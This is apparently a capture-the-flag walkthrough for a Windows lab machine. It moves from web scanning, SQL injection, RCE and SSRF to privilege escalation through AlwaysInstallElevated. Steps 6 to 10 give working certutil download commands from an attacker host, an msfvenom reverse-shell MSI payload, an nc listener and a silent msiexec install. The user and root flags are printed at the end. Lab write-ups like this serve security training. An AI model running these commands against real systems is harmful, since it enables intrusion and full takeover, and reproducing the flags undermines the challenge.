
-----------

**Step 1: Port 80 HTTP Scanning**

**Command:** 
```
whatweb http://10.10.10.239
```

**Explanation:** We start by using the `whatweb` tool to scan the HTTP service on port 80 of the target machine. This helps us gather initial information about the web application running on this port.

**Tags:** Port Scanning, whatweb

---

**Step 2: Web Application Fuzzing with Nmap**

**Command:** 
```
nmap --script http-enum -p80 10.10.10.239 -oN fuzzweb
```

**Explanation:** We employ `nmap` with the `http-enum` script to perform web application fuzzing on port 80. This helps us discover directories and potentially vulnerable endpoints.

**Tags:** Port Scanning, Vulnerability Scanning, nmap, Web Application Fuzzing

---

**Step 3: Exploiting SQL Injection**

**Explanation:** After discovering the "Authentication Bypass SQLi" vulnerability in the login panel of the "voting system," we use `Burp Suite` to analyze and manipulate the SQL injection request, exploiting it with a payload obtained from `searchsploit`.

**Tags:** SQL Injection, Burp Suite, Exploitation

---

**Step 4: Exploiting Remote Code Execution**

**Explanation:** We find a "remote code execution" vulnerability in the application. We can exploit it manually by uploading a malicious PHP file. Alternatively, we can automate the attack using a Python script found in `searchsploit`.

**Tags:** Remote Code Execution, Exploitation, Python Script

---

**Step 5: SSRF Attack**

**Explanation:** We notice a domain and subdomain on port 443. We add them to our hosts file to establish a connection. Then, by exploiting a potential SSRF vulnerability, we gain access to port 5000, which is otherwise restricted. We find admin credentials, which we use to log in to the voting application and attempt the remote code execution.

**Tags:** SSRF, Port Scanning, Exploitation

---

**Step 6: Privilege Escalation with Winpeas**

**Commands:**
```
# On Attacker's Machine
sudo python -m http.server 80

# On Victim's Machine
certutil.exe -f -urlcache -split http://10.10.14.2/winPeas.exe winpeas.exe
```

**Explanation:** We use the `winpeas` tool to scan the victim's machine for potential privilege escalation vulnerabilities. We download it using `certutil.exe`.

**Tags:** Privilege Escalation, Winpeas, Certutil

---

**Step 7: Abusing "AlwaysInstallElevated"**

**Explanation:** We identify the "AlwaysInstallElevated" setting in the Windows Registry. If it's set to 1 in HKLM and HKCU, we can abuse it for privilege escalation. This involves creating a malicious .msi file and executing it with `msiexec`.

**Tags:** Privilege Escalation, Registry Settings, msiexec

---

**Step 8: Creating a Malicious .msi File**

**Command:**
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=1234 --platform windows -a x64 -f msi -o reverse.msi
```

**Explanation:** We use `msfvenom` to generate a malicious .msi file that will establish a reverse shell connection to our attacker machine.

**Tags:** msfvenom, Payload Generation

---

**Step 9: Downloading and Installing the Malicious .msi**

**Commands:**
```
# On Attacker's Machine
sudo python -m http.server 80

# On Victim's Machine
certutil.exe -f -urlcache -split http://10.10.14.2/reverse.msi reverse.msi
```

**Explanation:** We serve the malicious .msi file from our attacker machine and download it on the victim's machine using `certutil.exe`.

**Tags:** Certutil, File Download

---

**Step 10: Gaining Administrator Access**

**Commands:**
```
# On Attacker's Machine
nc -nlvp 1234

# On Victim's Machine
msiexec /quiet /qn /i reverse.msi
```

**Explanation:** We set up a listener on our attacker machine and execute the downloaded .msi file on the victim's machine using `msiexec`, gaining administrator access.

**Tags:** Privilege Escalation, Reverse Shell

---
user flag 1eef3792b3eca549bd689af404afb435
root flag 460f37d2d0e6c0f859802e9ffbd5bd22